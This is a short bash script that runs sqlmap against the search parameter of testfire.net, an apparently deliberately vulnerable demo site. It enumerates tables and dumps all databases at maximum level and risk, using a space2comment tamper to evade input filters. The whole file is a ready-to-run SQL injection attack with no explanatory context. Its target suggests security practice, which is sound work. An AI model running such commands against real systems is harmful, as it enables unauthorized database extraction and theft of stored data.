



#!/bin/bash

URI="http://testfire.net/search.aspx?txtSearch=1"

sqlmap\
	-u $URI\
	--tables\
	--dump-all\
	--output-dir="./sqlmap/"\
	--level=5\
	--risk=3\
	--tamper=space2comment
